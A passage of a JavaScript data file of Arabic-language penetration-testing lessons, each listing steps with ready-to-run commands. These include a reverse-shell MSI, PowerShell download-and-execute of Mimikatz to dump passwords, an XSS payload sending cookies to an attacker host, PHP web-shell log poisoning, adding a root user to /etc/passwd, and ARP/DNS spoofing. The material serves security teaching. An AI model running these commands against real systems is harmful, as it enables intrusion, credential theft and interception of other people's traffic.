        { cmd: 'msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f msi > evil.msi\nmsiexec /quiet /qn /i evil.msi', note: 'استغلال AlwaysInstallElevated' }
      ] },
    { title: 'Token Impersonation', desc: 'اسرق SYSTEM Token.',
      commands: [
        { cmd: 'whoami /priv', note: 'تحقق من وجود SeImpersonatePrivilege' },
        { cmd: '.\\PrintSpoofer64.exe -i -c cmd', note: 'الوصول لـ SYSTEM عبر PrintSpoofer' }
      ] }
  ]
},

// ─── درس 18: API Security ───────────────────────────────────
{
  id: 118, icon: '🔌', title: 'اختبار أمان APIs',
  desc: 'اختبار شامل لأمان REST APIs.', difficulty: 'intermediate', type: 'Web', time: '45-60 دقيقة',
  steps: [
    { title: 'تعداد API Endpoints', desc: 'اكتشف نقاط نهاية API.',
      commands: [
        { cmd: 'ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/api/api-endpoints.txt -u http://target.com/api/FUZZ', note: 'اكتشاف API Endpoints' },
        { cmd: 'gobuster dir -u http://target.com/api -w api-endpoints.txt', note: 'بديل بـ gobuster' }
      ] },
    { title: 'تحليل JWT Tokens', desc: 'افحص JWT للثغرات.',
      commands: [
        { cmd: 'echo "JWT_TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null', note: 'فك تشفير payload الـ JWT' },
        { cmd: 'hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt', note: 'كسر JWT Secret الضعيف' }
      ] },
    { title: 'اختبار IDOR', desc: 'جرّب تغيير الـ ID للوصول لبيانات آخرين.',
      commands: [
        { cmd: 'curl -H "Authorization: Bearer TOKEN" http://target.com/api/users/1', note: 'بياناتك' },
        { cmd: 'curl -H "Authorization: Bearer TOKEN" http://target.com/api/users/2', note: 'بيانات مستخدم آخر - IDOR!' }
      ] },
    { title: 'اختبار SSRF', desc: 'اختبر إذا كان الخادم يطلب URLsداخلية.',
      commands: [
        { cmd: 'curl -X POST http://target.com/api/fetch -H "Content-Type: application/json" -d \'{"url":"http://169.254.169.254/latest/meta-data/"}\'', note: 'SSRF للوصول لـ AWS Metadata' }
      ] }
  ]
},

// ─── درس 19: Social Engineering ─────────────────────────────
{
  id: 119, icon: '🎭', title: 'الهندسة الاجتماعية',
  desc: 'تقنيات Social Engineering المرخّصة.', difficulty: 'intermediate', type: 'Social', time: '45-60 دقيقة',
  steps: [
    { title: 'GoPhish لحملات التصيد', desc: 'إعداد حملة Phishing محاكاة.',
      commands: [
        { cmd: 'wget https://github.com/gophish/gophish/releases/latest/download/gophish-linux-64bit.zip\nunzip gophish*.zip && chmod +x gophish\nsudo ./gophish', note: 'تشغيل GoPhish' }
      ], tip: 'افتح https://localhost:3333 - admin/gophish' },
    { title: 'SET - Social Engineering Toolkit', desc: 'أداة شاملة للهندسة الاجتماعية.',
      commands: [
        { cmd: 'sudo setoolkit', note: 'تشغيل SET' },
        { cmd: '# 1) Social-Engineering Attacks\n# 2) Website Attack Vectors\n# 3) Credential Harvester\n# 2) Site Cloner', note: 'نسخ موقع وجمع بيانات الاعتماد' }
      ], warning: 'للتدريب فقط في بيئات مرخصة' },
    { title: 'evilginx2 لتجاوز 2FA', desc: 'اعترض sessions حتى مع المصادقة الثنائية.',
      commands: [
        { cmd: 'sudo evilginx2\nconfig domain phish.example.com\nconfig ip YOUR_VPS_IP', note: 'إعداد evilginx2' }
      ] }
  ]
},

// ─── درس 20: Malware Analysis ───────────────────────────────
{
  id: 120, icon: '🦠', title: 'تحليل البرمجيات الخبيثة',
  desc: 'تحليل ثابت وديناميكي للـ Malware.', difficulty: 'advanced', type: 'Forensics', time: '60-90 دقيقة',
  steps: [
    { title: 'التحليل الثابت (Static)', desc: 'افحص الملف بدون تشغيله.',
      commands: [
        { cmd: 'file malware.exe', note: 'نوع الملف الحقيقي' },
        { cmd: 'sha256sum malware.exe', note: 'احسب الـ Hash للبحث في VirusTotal' },
        { cmd: 'strings malware.exe | grep -i "http\\|ftp\\|cmd\\|powershell"', note: 'استخراج النصوص المضمنة' }
      ] },
    { title: 'فحص VirusTotal', desc: 'تحقق إذا كان Malware معروفاً.',
      commands: [
        { cmd: '# احسب الـ hash:\nsha256sum malware.exe\n# ثم ابحث على: https://www.virustotal.com', note: 'البحث في VirusTotal بالـ Hash' }
      ] },
    { title: 'Cuckoo Sandbox', desc: 'شغّل الـ Malware في بيئة معزولة.',
      commands: [
        { cmd: 'cuckoo submit malware.exe', note: 'تحليل ديناميكي بـ Cuckoo' }
      ], warning: 'استخدم VM معزولة تماماً عن شبكتك الرئيسية' },
    { title: 'Reverse Engineering بـ Ghidra', desc: 'حلل الكود الثنائي بـ Ghidra.',
      commands: [
        { cmd: 'ghidraRun', note: 'تشغيل Ghidra' },
        { cmd: '# File > New Project > Import File > Analyze\n# افتح CodeBrowser لرؤية الكود', note: 'تحليل الـ Binary' }
      ] }
  ]
},

// ─── درس 21: Android Security ───────────────────────────────
{
  id: 121, icon: '📱', title: 'فحص تطبيقات الأندرويد',
  desc: 'اختبار أمان تطبيقات Android.', difficulty: 'advanced', type: 'Mobile', time: '60-90 دقيقة',
  steps: [
    { title: 'تحليل APK ثابتاً', desc: 'فكّك APK وابحث عن secrets.',
      commands: [
        { cmd: 'apktool d application.apk -o decompiled/', note: 'فك ضغط APK' },
        { cmd: 'jadx -d java_output/ application.apk', note: 'تحويل لـ Java مقروء' },
        { cmd: 'grep -r "password\\|api_key\\|secret" decompiled/', note: 'البحث عن بيانات حساسة' }
      ] },
    { title: 'فحص AndroidManifest.xml', desc: 'الـ Manifest يكشف الصلاحيات والمكونات.',
      commands: [
        { cmd: 'cat decompiled/AndroidManifest.xml | grep -i "exported\\|permission\\|debuggable"', note: 'تحليل الـ Manifest' }
      ] },
    { title: 'MobSF للتحليل الشامل', desc: 'أداة متكاملة للتحليل الثابت والديناميكي.',
      commands: [
        { cmd: 'docker run -it --rm -p 8000:8000 opensecurity/mobile-security-framework-mobsf', note: 'تشغيل MobSF بـ Docker' }
      ] },
    { title: 'Frida لتجاوز SSL Pinning', desc: 'اعترض HTTPS رغم SSL Pinning.',
      commands: [
        { cmd: 'adb push frida-server /data/local/tmp/\nadb shell "chmod 755 /data/local/tmp/frida-server && /data/local/tmp/frida-server &"', note: 'رفع Frida Server للجهاز' },
        { cmd: 'frida -U -n com.example.app -l ssl_bypass.js', note: 'تجاوز SSL Pinning' }
      ] }
  ]
},

// ─── درس 22: Cloud Security ─────────────────────────────────
{
  id: 122, icon: '☁️', title: 'اختبار أمان السحابة',
  desc: 'فحص AWS وبيئات السحابة.', difficulty: 'advanced', type: 'Cloud', time: '60-90 دقيقة',
  steps: [
    { title: 'اكتشاف S3 Buckets المكشوفة', desc: 'ابحث عن S3 بدون حماية.',
      commands: [
        { cmd: 'aws s3 ls s3://company-bucket --no-sign-request', note: 'الوصول بدون مصادقة' },
        { cmd: 's3scanner scan --bucket company-bucket', note: 'فحص bucket بـ s3scanner' }
      ] },
    { title: 'فحص IAM', desc: 'تحقق من صلاحيات IAM الزائدة.',
      commands: [
        { cmd: 'aws iam list-users', note: 'قائمة مستخدمي IAM' },
        { cmd: 'prowler aws', note: 'فحص شامل لأمان AWS بـ Prowler' }
      ] },
    { title: 'SSRF للوصول لـ Metadata', desc: 'استغل SSRF للوصول لمعلومات الـ instance.',
      commands: [
        { cmd: 'curl http://169.254.169.254/latest/meta-data/', note: 'AWS Instance Metadata' },
        { cmd: 'curl http://169.254.169.254/latest/meta-data/iam/security-credentials/', note: 'بيانات اعتماد IAM' }
      ], warning: 'استخدم فقط على instances مرخصة' }
  ]
},

// ─── درس 23: MITM Attacks ───────────────────────────────────
{
  id: 123, icon: '🕵️', title: 'هجمات Man-in-the-Middle',
  desc: 'اعتراض الاتصالات في الشبكة المحلية.', difficulty: 'intermediate', type: 'Network', time: '45-60 دقيقة',
  steps: [
    { title: 'تفعيل IP Forwarding', desc: 'لازم لإعادة توجيه الحزم.',
      commands: [
        { cmd: 'echo 1 > /proc/sys/net/ipv4/ip_forward', note: 'تفعيل IP Forwarding مؤقتاً' }
      ] },
    { title: 'ARP Spoofing', desc: 'أوهم الشبكة بأن MAC جهازك هو MAC الراوتر.',
      commands: [
        { cmd: 'arpspoof -i eth0 -t 192.168.1.100 192.168.1.1', note: 'إرسال ARP مزيف للضحية' },
        { cmd: 'arpspoof -i eth0 -t 192.168.1.1 192.168.1.100', note: 'إرسال ARP مزيف للراوتر' }
      ] },
    { title: 'Bettercap للـ MITM الكامل', desc: 'أداة متكاملة للـ MITM.',
      commands: [
        { cmd: 'sudo bettercap -iface eth0', note: 'تشغيل Bettercap' },
        { cmd: 'net.probe on\narp.spoof.targets 192.168.1.100\narp.spoof on\nnet.sniff on', note: 'تفعيل MITM وجمع البيانات' }
      ], warning: 'غير قانوني على شبكات دون إذن صريح' },
    { title: 'SSL Stripping', desc: 'حوّل HTTPS إلى HTTP لاعتراضه.',
      commands: [
        { cmd: 'set https.proxy.sslstrip true\nhttps.proxy on', note: 'SSL Strip في Bettercap' }
      ] }
  ]
},

// ─── درس 24: CTF & Cryptography ─────────────────────────────
{
  id: 124, icon: '🏆', title: 'CTF والتشفير',
  desc: 'أدوات وتقنيات CTF من تشفير وإخفاء معلومات.', difficulty: 'intermediate', type: 'CTF', time: '45-60 دقيقة',
  steps: [
    { title: 'فك التشفير الأساسي', desc: 'CyberChef وأوامر Linux لفك التشفير.',
      commands: [
        { cmd: 'echo "SGVsbG8=" | base64 -d', note: 'فك تشفير Base64' },
        { cmd: 'echo "48656c6c6f" | xxd -r -p', note: 'فك تشفير Hex' },
        { cmd: 'echo "Hello" | tr a-zA-Z n-za-mN-ZA-M', note: 'فك تشفير ROT13' }
      ] },
    { title: 'Steganography', desc: 'اكشف البيانات المخفية في الصور.',
      commands: [
        { cmd: 'steghide extract -sf image.jpg', note: 'استخراج بيانات مخفية' },
        { cmd: 'zsteg -a challenge.png', note: 'فحص PNG بـ zsteg' },
        { cmd: 'binwalk -e suspicious_file', note: 'استخراج ملفات مضمنة' },
        { cmd: 'exiftool image.jpg', note: 'فحص Metadata' }
      ] },
    { title: 'تحليل PCAP في CTF', desc: 'ابحث عن الـ Flag في حزم الشبكة.',
      commands: [
        { cmd: 'tshark -r challenge.pcap -Y "http" -T fields -e http.file_data | strings | grep -i "flag"', note: 'البحث عن Flag في HTTP' }
      ] }
  ]
},

// ─── درس 25: Docker Security ────────────────────────────────
{
  id: 125, icon: '🐳', title: 'أمان Docker',
  desc: 'فحص أمان Docker وContainer Escape.', difficulty: 'advanced', type: 'Cloud', time: '45-60 دقيقة',
  steps: [
    { title: 'التعرف على بيئة Container', desc: 'تحقق إذا كنت داخل Docker.',
      commands: [
        { cmd: 'cat /proc/1/cgroup | grep docker', note: 'الكشف عن Docker من الداخل' },
        { cmd: 'ls /.dockerenv', note: 'ملف موجود فقط داخل Docker' }
      ] },
    { title: 'Privileged Container Escape', desc: 'اهرب من Container بـ --privileged.',
      commands: [
        { cmd: 'fdisk -l', note: 'عرض أقسام القرص' },
        { cmd: 'mount /dev/sda1 /mnt && chroot /mnt /bin/bash', note: 'Mount الـ Host filesystem' }
      ] },
    { title: 'Docker Socket Escape', desc: 'Docker Socket = تحكم كامل.',
      commands: [
        { cmd: 'ls -la /var/run/docker.sock', note: 'تحقق من وجود Docker Socket' },
        { cmd: 'curl --unix-socket /var/run/docker.sock http://localhost/images/json', note: 'الاتصال بـ Docker API' }
      ] }
  ]
},

// ─── درس 26: PowerShell Attacks ─────────────────────────────
{
  id: 126, icon: '💻', title: 'PowerShell للاختبار',
  desc: 'استخدام PowerShell في Post-Exploitation.', difficulty: 'advanced', type: 'Exploitation', time: '45-60 دقيقة',
  steps: [
    { title: 'تجاوز Execution Policy', desc: 'شغّل سكريبتات PowerShell.',
      commands: [
        { cmd: 'powershell -ExecutionPolicy Bypass -File script.ps1', note: 'تجاوز Policy مباشرة' },
        { cmd: 'IEX (New-Object Net.WebClient).DownloadString("http://attacker/script.ps1")', note: 'تشغيل من الإنترنت مباشرة' }
      ] },
    { title: 'جمع معلومات Windows', desc: 'استخدم PS لاستطلاع النظام.',
      commands: [
        { cmd: 'Get-LocalUser', note: 'قائمة المستخدمين المحليين' },
        { cmd: 'Get-LocalGroupMember Administrators', note: 'أعضاء مجموعة Administrators' },
        { cmd: 'Get-NetAdapter | Select Name,Status', note: 'بطاقات الشبكة' }
      ] },
    { title: 'Fileless Attack', desc: 'شغّل كود في الذاكرة بدون كتابة ملف.',
      commands: [
        { cmd: 'IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1")\nInvoke-Mimikatz -Command "sekurlsa::logonpasswords"', note: 'استخراج Credentials من الذاكرة' }
      ], warning: 'مراقَب بشدة من EDR - استخدم في بيئات تدريب فقط' }
  ]
},

// ─── درس 27: Exploit Development ────────────────────────────
{
  id: 127, icon: '⚙️', title: 'تطوير Exploits',
  desc: 'أساسيات Buffer Overflow وROP Chains.', difficulty: 'advanced', type: 'Exploitation', time: '90-120 دقيقة',
  steps: [
    { title: 'إعداد GDB مع PEDA', desc: 'بيئة تطوير Exploits.',
      commands: [
        { cmd: 'git clone https://github.com/longld/peda.git ~/peda\necho "source ~/peda/peda.py" >> ~/.gdbinit', note: 'تثبيت PEDA' },
        { cmd: 'gdb ./vulnerable\ninfo registers\ndisassemble main', note: 'فتح binary بـ GDB' }
      ] },
    { title: 'إيجاد Buffer Overflow Offset', desc: 'حدد الـ offset الدقيق.',
      commands: [
        { cmd: 'python3 -c "from pwn import *; print(cyclic(200))" > pattern.txt\ngdb ./vuln\nrun < pattern.txt', note: 'إنشاء Pattern وتشغيل البرنامج' },
        { cmd: 'python3 -c "from pwn import *; print(cyclic_find(0x61616166))"', note: 'إيجاد الـ Offset من القيمة' }
      ] },
    { title: 'كتابة Exploit بـ pwntools', desc: 'استخدم pwntools لكتابة exploit.',
      commands: [
        { cmd: 'from pwn import *\np = process("./vulnerable")\noffset = 112\nexploit = b"A" * offset + p32(0xdeadbeef)\np.sendline(exploit)\np.interactive()', note: 'Exploit أساسي بـ pwntools' }
      ] }
  ]
},

// ─── درس 28: WiFi Advanced ──────────────────────────────────
{
  id: 128, icon: '📡', title: 'هجمات WiFi المتقدمة',
  desc: 'Evil Twin وPMKID وWPA3.', difficulty: 'advanced', type: 'Wireless', time: '60-90 دقيقة',
  steps: [
    { title: 'PMKID Attack', desc: 'لا تحتاج Handshake كامل.',
      commands: [
        { cmd: 'sudo hcxdumptool -o pmkid.pcapng -i wlan0mon --enable_status=1', note: 'التقاط PMKID' },
        { cmd: 'hcxpcapngtool -o hashes.hc22000 pmkid.pcapng\nhashcat -m 22000 hashes.hc22000 rockyou.txt', note: 'تحويل وكسر' }
      ] },
    { title: 'Evil Twin Attack', desc: 'نقطة وصول وهمية.',
      commands: [
        { cmd: 'airbase-ng -e "TargetWiFi" -c 6 wlan0mon', note: 'إنشاء AP وهمي' },
        { cmd: 'ifconfig at0 up 10.0.0.1/24', note: 'إعداد IP للـ AP' }
      ], warning: 'غير قانوني بدون إذن صريح' },
    { title: 'Deauth Flood', desc: 'افصل العملاء عن الشبكة.',
      commands: [
        { cmd: 'sudo aireplay-ng --deauth 0 -a BSSID wlan0mon', note: 'إرسال deauth مستمر' }
      ] }
  ]
},

// ─── درس 29: Database Security ──────────────────────────────
{
  id: 129, icon: '🗄️', title: 'اختبار قواعد البيانات',
  desc: 'فحص MySQL وPostgreSQL وMongoDB.', difficulty: 'intermediate', type: 'Database', time: '45-60 دقيقة',
  steps: [
    { title: 'فحص MySQL', desc: 'ابحث عن MySQL بدون كلمة مرور.',
      commands: [
        { cmd: 'nmap --script=mysql-empty-password -p 3306 192.168.1.10', note: 'فحص root بدون كلمة مرور' },
        { cmd: 'mysql -h 192.168.1.10 -u root', note: 'محاولة الدخول بدون كلمة مرور' }
      ] },
    { title: 'Brute Force قواعد البيانات', desc: 'استخدم Hydra لكسر كلمات المرور.',
      commands: [
        { cmd: 'hydra -l root -P rockyou.txt mysql://192.168.1.10', note: 'Brute Force MySQL' },
        { cmd: 'hydra -l postgres -P rockyou.txt postgres://192.168.1.10', note: 'Brute Force PostgreSQL' }
      ] },
    { title: 'استغلال PostgreSQL', desc: 'استخدم COPY لتنفيذ أوامر.',
      commands: [
        { cmd: 'psql -h 192.168.1.10 -U postgres\nCREATE TABLE cmd(output text);\nCOPY cmd FROM PROGRAM \'id\';', note: 'تنفيذ أوامر OS عبر PostgreSQL' }
      ] }
  ]
},

// ─── درس 30: Pentest Reporting ──────────────────────────────
{
  id: 130, icon: '📋', title: 'التقارير الاحترافية',
  desc: 'كتابة تقارير اختبار الاختراق الاحترافية.', difficulty: 'easy', type: 'Reporting', time: '30-60 دقيقة',
  steps: [
    { title: 'هيكل التقرير', desc: 'هيكل تقرير اختبار الاختراق المعياري.',
      commands: [
        { cmd: '# هيكل التقرير:\n# 1. الملخص التنفيذي\n# 2. نطاق الاختبار والمنهجية\n# 3. الثغرات المكتشفة (بالخطورة)\n# 4. خطوات الاستغلال مع الأدلة\n# 5. التوصيات والحلول\n# 6. الملاحق', note: 'هيكل تقرير اختبار الاختراق' }
      ] },
    { title: 'تقييم الخطورة CVSS', desc: 'قيّم الثغرات بمعيار CVSS.',
      commands: [
        { cmd: '# CVSS Scores:\n# 9.0-10.0 = Critical\n# 7.0-8.9  = High\n# 4.0-6.9  = Medium\n# 0.1-3.9  = Low\n# الحاسبة: https://nvd.nist.gov/vuln-metrics/cvss', note: 'معيار CVSS للخطورة' }
      ] },
    { title: 'توثيق الأدلة', desc: 'التقط الأدلة بشكل منظم.',
      commands: [
        { cmd: 'flameshot gui', note: 'التقاط Screenshot مع تعليقات' },
        { cmd: 'script -a pentest_session.log', note: 'تسجيل جلسة الطرفية كاملة' }
      ] }
  ]
},

// ─── درس 31: XSS ────────────────────────────────────────────
{
  id: 131, icon: '🔗', title: 'اختبار XSS',
  desc: 'اكتشاف واستغلال ثغرات Cross-Site Scripting.', difficulty: 'intermediate', type: 'Web', time: '45-60 دقيقة',
  steps: [
    { title: 'اكتشاف XSS يدوياً', desc: 'جرّب payloads أساسية في حقول الإدخال.',
      commands: [
        { cmd: "# Reflected XSS:\ncurl 'http://target.com/search?q=<script>alert(1)</script>'", note: 'اختبار Reflected XSS' },
        { cmd: '# DOM XSS:\n# أضف في URL: #<img src=x onerror=alert(1)>', note: 'اختبار DOM XSS' }
      ] },
    { title: 'Payloads لتجاوز الفلاتر', desc: 'استخدم payloads متقدمة.',
      commands: [
        { cmd: '<img src=x onerror=confirm(1)>', note: 'تجاوز فلتر script' },
        { cmd: '<svg onload=eval(atob("YWxlcnQoMSk="))>', note: 'Payload مشفر بـ base64' }
      ] },
    { title: 'سرقة Cookies', desc: 'الهدف الحقيقي من XSS.',
      commands: [
        { cmd: 'nc -lvnp 80', note: 'استمع على المهاجم' },
        { cmd: '# Payload:\n<script>document.location="http://ATTACKER/?c="+document.cookie</script>', note: 'سرقة Cookie' }
      ] },
    { title: 'XSStrike للأتمتة', desc: 'اكتشاف XSS تلقائياً.',
      commands: [
        { cmd: 'xsstrike -u "http://target.com/search?q=test" --crawl', note: 'فحص XSS شامل تلقائي' }
      ] }
  ]
},

// ─── درس 32: CSRF ───────────────────────────────────────────
{
  id: 132, icon: '🍪', title: 'اختبار CSRF والـ Cookies',
  desc: 'فهم واستغلال ثغرات CSRF.', difficulty: 'intermediate', type: 'Web', time: '45-60 دقيقة',
  steps: [
    { title: 'اكتشاف CSRF', desc: 'ابحث عن نماذج بدون CSRF Token.',
      commands: [
        { cmd: 'curl -v http://target.com/account 2>&1 | grep -i "csrf\\|token\\|hidden"', note: 'البحث عن CSRF Token في الـ HTML' }
      ], tip: 'كل طلب POST يغير بيانات يجب أن يحمل CSRF Token' },
    { title: 'فحص Cookie Flags', desc: 'تحقق من إعدادات الأمان للـ Cookies.',
      commands: [
        { cmd: 'curl -v http://target.com/login 2>&1 | grep -i "set-cookie"', note: 'فحص Cookie headers' }
      ], tip: 'Cookie آمنة = Secure; HttpOnly; SameSite=Strict' },
    { title: 'إنشاء CSRF PoC', desc: 'أنشئ صفحة HTML لاختبار CSRF.',
      commands: [
        { cmd: '# PoC HTML:\n<form action="http://target.com/changemail" method="POST">\n  <input name="email" value="attacker@evil.com">\n</form>\n<script>document.forms[0].submit()</script>', note: 'CSRF PoC لتغيير الإيميل' }
      ] }
  ]
},

// ─── درس 33: LFI/RFI ────────────────────────────────────────
{
  id: 133, icon: '📁', title: 'File Inclusion - LFI وRFI',
  desc: 'اكتشاف واستغلال ثغرات File Inclusion.', difficulty: 'intermediate', type: 'Web', time: '45-60 دقيقة',
  steps: [
    { title: 'اختبار LFI', desc: 'جرّب قراءة /etc/passwd.',
      commands: [
        { cmd: "curl 'http://target.com/?page=../../../../etc/passwd'", note: 'LFI أساسي' },
        { cmd: "curl 'http://target.com/?page=....//....//etc/passwd'", note: 'تجاوز فلتر المسار' }
      ] },
    { title: 'Log Poisoning للـ RCE', desc: 'حقن PHP code في logs.',
      commands: [
        { cmd: 'curl -A "<?php system($_GET[cmd]); ?>" http://target.com', note: 'حقن PHP في User-Agent' },
        { cmd: "curl 'http://target.com/?page=/var/log/apache2/access.log&cmd=id'", note: 'تنفيذ الكود عبر LFI' }
      ], tip: 'يعمل فقط إذا كان بإمكانك قراءة access.log عبر LFI' },
    { title: 'PHP Wrappers', desc: 'استخدم PHP Wrappers لقراءة الكود.',
      commands: [
        { cmd: "curl 'http://target.com/?page=php://filter/convert.base64-encode/resource=config.php'", note: 'قراءة كود PHP بـ base64' },
        { cmd: 'base64 -d <<< "ENCODED_OUTPUT"', note: 'فك تشفير الكود' }
      ] }
  ]
},

// ─── درس 34: Hashcat Advanced ───────────────────────────────
{
  id: 134, icon: '🔓', title: 'Hashcat المتقدم',
  desc: 'جميع طرق Hashcat من Dictionary لـ Hybrid.', difficulty: 'intermediate', type: 'Password', time: '45-60 دقيقة',
  steps: [
    { title: 'Dictionary Attack', desc: 'أسرع الطرق وأعلى نسبة نجاح.',
      commands: [
        { cmd: 'hashcat -m 0 hashes.txt rockyou.txt', note: 'كسر MD5 بقاموس' },
        { cmd: 'hashcat -m 1000 hashes.txt rockyou.txt', note: 'كسر NTLM' },
        { cmd: 'hashcat -m 1800 hashes.txt rockyou.txt', note: 'كسر SHA-512 (Linux shadow)' }
      ] },
    { title: 'Rule-Based Attack', desc: 'القواعد تضاعف فعالية القاموس.',
      commands: [
        { cmd: 'hashcat -m 0 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule', note: 'best64 = أشهر القواعد' },
        { cmd: 'hashcat -m 0 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule', note: 'قواعد rockyou المتقدمة' }
      ] },
    { title: 'Mask Attack', desc: 'هجوم بنمط محدد.',
      commands: [
        { cmd: 'hashcat -m 0 hash.txt -a 3 ?u?l?l?l?l?d?d?d?d', note: 'Capital + 4 letters + 4 numbers' },
        { cmd: 'hashcat -m 0 hash.txt -a 3 Pass?d?d?d?d', note: 'كلمة تبدأ بـ Pass' }
      ] }
  ]
},

// ─── درس 35: Linux PrivEsc Advanced ─────────────────────────
{
  id: 135, icon: '⬆️', title: 'رفع الصلاحيات Linux المتقدم',
  desc: 'مسارات متقدمة لرفع الصلاحيات.', difficulty: 'advanced', type: 'PrivEsc', time: '60-90 دقيقة',
  steps: [
    { title: 'PATH Hijacking', desc: 'استبدل binary في PATH بـ script خبيث.',
      commands: [
        { cmd: 'echo $PATH', note: 'عرض مسارات PATH' },
        { cmd: 'echo "/bin/bash" > /tmp/ls && chmod +x /tmp/ls\nexport PATH=/tmp:$PATH', note: 'إنشاء ls مزيف' }
      ] },
    { title: 'Writable /etc/passwd', desc: 'إذا كان /etc/passwd قابلاً للكتابة.',
      commands: [
        { cmd: 'ls -la /etc/passwd', note: 'تحقق من الصلاحيات' },
        { cmd: 'echo "hacker:$(openssl passwd -1 password):0:0:root:/root:/bin/bash" >> /etc/passwd', note: 'إضافة مستخدم root' }
      ] },
    { title: 'NFS No_root_squash', desc: 'استغلال NFS غير الآمن.',
      commands: [
        { cmd: 'cat /etc/exports', note: 'فحص إعدادات NFS' },
        { cmd: 'showmount -e TARGET_IP', note: 'عرض Shares المتاحة' },
        { cmd: 'mount -t nfs TARGET_IP:/share /mnt/nfs', note: 'Mount الـ Share' }
      ] }
  ]
},

// ─── درس 36: Windows PrivEsc Advanced ───────────────────────
{
  id: 136, icon: '🪟', title: 'رفع الصلاحيات Windows المتقدم',
  desc: 'مسارات متقدمة لـ Windows PrivEsc.', difficulty: 'advanced', type: 'PrivEsc', time: '60-90 دقيقة',
  steps: [
    { title: 'Unquoted Service Path', desc: 'مسار خدمة بمسافات = ثغرة.',
      commands: [
        { cmd: 'wmic service get name,pathname | findstr /i /v "C:\\Windows\\\\" | findstr /i /v "\\""', note: 'البحث عن Unquoted Service Paths' }
      ] },
    { title: 'DLL Hijacking', desc: 'ضع DLL خبيث في مسار يبحث عنه البرنامج.',
      commands: [
        { cmd: 'procmon.exe # راقب أخطاء NAME NOT FOUND للـ DLL', note: 'اكتشاف DLL Hijacking بـ ProcMon' }
      ] },
    { title: 'Scheduled Tasks', desc: 'ابحث عن مهام مجدولة قابلة للاستغلال.',
      commands: [
        { cmd: 'schtasks /query /fo LIST /v | findstr "Task Name\\|Run As\\|Task To Run"', note: 'عرض تفاصيل المهام المجدولة' }
      ] }
  ]
},

// ─── درس 37: MITM Advanced ──────────────────────────────────
{
  id: 137, icon: '🕵️', title: 'هجمات MITM المتقدمة',
  desc: 'تقنيات اعتراض متقدمة مع DNS Spoofing.', difficulty: 'advanced', type: 'Network', time: '45-60 دقيقة',
  steps: [
    { title: 'DNS Spoofing', desc: 'حوّل طلبات DNS لصفحات وهمية.',
      commands: [
        { cmd: 'sudo bettercap -iface eth0', note: 'تشغيل bettercap' },
        { cmd: 'set dns.spoof.domains target.com\nset dns.spoof.address 192.168.1.5\ndns.spoof on', note: 'تفعيل DNS Spoofing' }
      ] },
    { title: 'اعتراض Credentials', desc: 'التقط كلمات المرور من الحزم.',
      commands: [
        { cmd: 'creds.show', note: 'عرض الـ Credentials المعترضة في bettercap' }
      ] },
    { title: 'مراقبة الـ Traffic', desc: 'اعرض البيانات المارة عبر جهازك.',
      commands: [
        { cmd: 'sudo tshark -i eth0 -Y "http.request.method == POST" -T fields -e http.host -e urlencoded-form.value', note: 'التقاط بيانات نماذج HTTP' }
      ] }
  ]
},

// ─── درس 38: Wireshark Advanced ─────────────────────────────
{
  id: 138, icon: '🦈', title: 'Wireshark المتقدم',
  desc: 'تحليل احترافي لحزم الشبكة.', difficulty: 'intermediate', type: 'Network', time: '45-60 دقيقة',
  steps: [
    { title: 'Follow TCP Stream', desc: 'شاهد المحادثة الكاملة بين عميل وخادم.',
      commands: [
        { cmd: '# في Wireshark:\n# Click على حزمة TCP\n# Right Click > Follow > TCP Stream', note: 'عرض المحادثة الكاملة' }
      ] },
    { title: 'استخراج ملفات HTTP', desc: 'استرجع الملفات المنقولة.',
      commands: [
        { cmd: 'tshark -r capture.pcap --export-objects http,exported_files/', note: 'استخراج كل الملفات من HTTP' }
      ] },
    { title: 'اكتشاف Nmap Scan', desc: 'تعرف على علامات الـ Port Scan.',
      commands: [
        { cmd: '# في Wireshark:\ntcp.flags.syn == 1 && tcp.flags.ack == 0', note: 'SYN Packets = Port Scan' }
      ] }
  ]
},

// ─── درس 39: John The Ripper ────────────────────────────────
{
  id: 139, icon: '🔨', title: 'John The Ripper',
  desc: 'كسر كلمات المرور من ملفات متعددة.', difficulty: 'intermediate', type: 'Password', time: '30-45 دقيقة',
  steps: [
    { title: 'كسر Linux Shadow', desc: 'استهدف ملفات /etc/shadow.',
      commands: [
        { cmd: 'sudo unshadow /etc/passwd /etc/shadow > combined.txt\njohn combined.txt --wordlist=/usr/share/wordlists/rockyou.txt', note: 'كسر هاشات Linux' },
        { cmd: 'john combined.txt --show', note: 'عرض الكلمات المكسورة' }
      ] },
    { title: 'كسر الملفات المشفرة', desc: 'ZIP وPDF وOffice.',
      commands: [
        { cmd: 'zip2john protected.zip > zip.hash\njohn zip.hash --wordlist=rockyou.txt', note: 'كسر ZIP' },
        { cmd: 'pdf2john protected.pdf > pdf.hash\njohn pdf.hash --wordlist=rockyou.txt', note: 'كسر PDF' },
        { cmd: 'office2john encrypted.docx > office.hash\njohn office.hash --wordlist=rockyou.txt', note: 'كسر Office' }
      ] }
  ]
},

// ─── درس 40: OSINT Advanced ─────────────────────────────────
{
  id: 140, icon: '🔭', title: 'OSINT المتقدم',
  desc: 'Maltego وRecon-ng وأدوات OSINT الاحترافية.', difficulty: 'beginner', type: 'Recon', time: '45-60 دقيقة',
  steps: [
    { title: 'Recon-ng إطار OSINT', desc: 'إطار مودولار مثل Metasploit للـ OSINT.',
      commands: [
        { cmd: 'recon-ng\nworkspaces create target_corp\nmodules load recon/domains-hosts/hackertarget\noptions set SOURCE target.com\nrun', note: 'جمع hosts بـ Recon-ng' }
      ] },
    { title: 'البحث في GitHub', desc: 'ابحث عن Credentials مرفوعة بالخطأ.',
      commands: [
        { cmd: '# GitHub Search:\n"target.com" password\n"target.com" aws_access_key\n"target.com" db_password', note: 'Google Dorks على GitHub' }
      ] },
    { title: 'DNS Recon', desc: 'احصل على كل سجلات DNS.',
      commands: [
        { cmd: 'dnsx -d target.com -a -cname -mx -txt -resp', note: 'استخراج جميع سجلات DNS' },
        { cmd: 'fierce --domain target.com', note: 'DNS Brute Force' }
      ] }
  ]
},

// ─── درس 41: Hydra ──────────────────────────────────────────
{
